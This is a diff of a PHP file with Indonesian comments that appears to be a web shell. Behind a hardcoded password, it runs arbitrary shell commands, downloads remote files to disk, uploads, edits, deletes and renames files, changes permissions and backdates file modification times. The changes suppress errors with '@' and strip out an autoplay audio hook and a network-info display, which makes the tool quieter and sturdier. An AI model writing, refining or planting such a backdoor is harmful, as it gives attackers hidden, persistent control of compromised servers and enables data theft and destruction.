@@ -3,6 +3,7 @@ session_start();
 
 define('PASSWORD', 'ayane111'); // Password untuk kontrol akses
 
+// Proses login
 if (isset($_POST['password'])) {
     if ($_POST['password'] === PASSWORD) {
         $_SESSION['authenticated'] = true;
@@ -12,17 +13,15 @@ if (isset($_POST['password'])) {
     }
 }
 
+// Proses logout
 if (isset($_POST['logout'])) {
     session_destroy();
     header("Location: " . $_SERVER['PHP_SELF']);
     exit;
 }
 
-function playAudio() {
-    echo '<audio autoplay><source src="https://c.top4top.io/m_3136q2v7f1.mp3" type="audio/mpeg"></audio>';
-}
-
 if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
+    // Tampilkan form login jika belum terautentikasi
     echo '
     <style>
         body {
@@ -96,12 +95,6 @@ function displaySystemInfo() {
     }
 }
 
-// Fungsi untuk menampilkan informasi jaringan
-function displayNetworkInfo() {
-    $output = shell_exec('ifconfig');
-    echo "<pre>$output</pre>";
-}
-
 // Fungsi untuk mengubah tanggal modifikasi file
 function changeFileDate($path, $newDate) {
     $timestamp = strtotime($newDate);
@@ -114,19 +107,21 @@ function changeFileDate($path, $newDate) {
 
 // Fungsi upload file dari URL
 function uploadFromUrl($url, $saveTo) {
-    $fileContent = file_get_contents($url);
+    $fileContent = @file_get_contents($url);
     if ($fileContent === FALSE) {
-        die('Gagal mengunduh file dari URL');
+        echo "<div class='alert alert-danger'>Gagal mengunduh file dari URL.</div>";
+        return;
     }
-    file_put_contents($saveTo, $fileContent);
-    playAudio();
+    if (@file_put_contents($saveTo, $fileContent) === FALSE) {
+        echo "<div class='alert alert-danger'>Gagal menyimpan file ke $saveTo.</div>";
+        return;
+    }
     echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
 }
 
 // Fungsi upload file dari form
 function uploadFromForm($file, $saveTo) {
-    if (move_uploaded_file($file['tmp_name'], $saveTo)) {
-        playAudio();
+    if (@move_uploaded_file($file['tmp_name'], $saveTo)) {
         echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
     } else {
         echo "<div class='alert alert-danger'>Gagal mengupload file.</div>";
@@ -331,44 +326,19 @@ function display_path_links($dir) {
 
 // Fungsi untuk menampilkan izin file
 function get_permissions($file) {
-    $perms = fileperms($file);
-    $info = '';
+    $perms = @fileperms($file);
+    if ($perms === FALSE) return '---------';
 
-    if (($perms & 0xC000) == 0xC000) {
-        $info = 's';
-    } elseif (($perms & 0xA000) == 0xA000) {
-        $info = 'l';
-    } elseif (($perms & 0x8000) == 0x8000) {
-        $info = '-';
-    } elseif (($perms & 0x6000) == 0x6000) {
-        $info = 'b';
-    } elseif (($perms & 0x4000) == 0x4000) {
-        $info = 'd';
-    } elseif (($perms & 0x2000) == 0x2000) {
-        $info = 'c';
-    } elseif (($perms & 0x1000) == 0x1000) {
-        $info = 'p';
-    } else {
-        $info = 'u';
-    }
-
-    $info .= (($perms & 0x0100) ? 'r' : '-');
-    $info .= (($perms & 0x0080) ? 'w' : '-');
-    $info .= (($perms & 0x0040) ?
-                (($perms & 0x0800) ? 's' : 'x' ) :
-                (($perms & 0x0800) ? 'S' : '-'));
-
-    $info .= (($perms & 0x0020) ? 'r' : '-');
-    $info .= (($perms & 0x0010) ? 'w' : '-');
-    $info .= (($perms & 0x0008) ?
-                (($perms & 0x0400) ? 's' : 'x' ) :
-                (($perms & 0x0400) ? 'S' : '-'));
-
-    $info .= (($perms & 0x0004) ? 'r' : '-');
-    $info .= (($perms & 0x0002) ? 'w' : '-');
-    $info .= (($perms & 0x0001) ?
-                (($perms & 0x0200) ? 't' : 'x' ) :
-                (($perms & 0x0200) ? 'T' : '-'));
+    $info = ($perms & 0x4000) ? 'd' : '-';
+    $info .= ($perms & 0x0100) ? 'r' : '-';
+    $info .= ($perms & 0x0080) ? 'w' : '-';
+    $info .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
+    $info .= ($perms & 0x0020) ? 'r' : '-';
+    $info .= ($perms & 0x0010) ? 'w' : '-';
+    $info .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
+    $info .= ($perms & 0x0004) ? 'r' : '-';
+    $info .= ($perms & 0x0002) ? 'w' : '-';
+    $info .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
 
     return $info;
 }
@@ -377,13 +347,13 @@ function get_permissions($file) {
 function deleteItem($path) {
     $path = base64_decode(urldecode($path));
     if (is_dir($path)) {
-        if (rmdir($path)) {
+        if (@rmdir($path)) {
             echo "<div class='alert alert-success'>Direktori berhasil dihapus.</div>";
         } else {
             echo "<div class='alert alert-danger'>Gagal menghapus direktori.</div>";
         }
     } else {
-        if (unlink($path)) {
+        if (@unlink($path)) {
             echo "<div class='alert alert-success'>File berhasil dihapus.</div>";
         } else {
             echo "<div class='alert alert-danger'>Gagal menghapus file.</div>";
@@ -394,7 +364,7 @@ function deleteItem($path) {
 // Fungsi untuk rename file/folder
 function renameFile($source, $destination) {
     $source = base64_decode(urldecode($source));
-    if (rename($source, $destination)) {
+    if (@rename($source, $destination)) {
         echo "<div class='alert alert-success'>File berhasil diganti namanya.</div>";
     } else {
         echo "<div class='alert alert-danger'>Gagal mengganti nama file.</div>";
@@ -407,7 +377,7 @@ function changePermissions($path, $mode, $copyFrom = null, $manual = false) {
     if ($copyFrom) {
         $copyFrom = realpath($copyFrom);
         if ($copyFrom && file_exists($copyFrom)) {
-            $mode = fileperms($copyFrom) & 0777; // Ambil izin chmod dari file lain
+            $mode = @fileperms($copyFrom) & 0777; // Ambil izin chmod dari file lain
         } else {
             echo "<div class='alert alert-danger'>File sumber chmod tidak ditemukan.</div>";
             return;
@@ -418,7 +388,7 @@ function changePermissions($path, $mode, $copyFrom = null, $manual = false) {
         $mode = octdec($mode);
     }
 
-    if (chmod($path, $mode)) {
+    if (@chmod($path, $mode)) {
         echo "<div class='alert alert-success'>Chmod berhasil diubah.</div>";
     } else {
         echo "<div class='alert alert-danger'>Gagal mengubah chmod.</div>";
@@ -434,7 +404,7 @@ function changeDate($path, $newdate) {
 // Fungsi untuk mengedit file
 function editFile($path, $content) {
     $path = base64_decode(urldecode($path));
-    if (file_put_contents($path, $content) !== false) {
+    if (@file_put_contents($path, $content) !== false) {
         echo "<div class='alert alert-success'>File berhasil diedit.</div>";
     } else {
         echo "<div class='alert alert-danger'>Gagal mengedit file.</div>";
@@ -444,7 +414,7 @@ function editFile($path, $content) {
 // Fungsi untuk menjalankan perintah terminal
 function executeCommand($command, $dir) {
     chdir($dir);
-    $output = shell_exec($command);
+    $output = @shell_exec($command);
     return htmlspecialchars($output);
 }
 
@@ -665,7 +635,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
 
         <!-- Informasi Jaringan -->
         <div id="networkInfo" class="network-info">
-            <?php displayNetworkInfo(); ?>
+            <?php //displayNetworkInfo(); ?>
         </div>
 
         <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
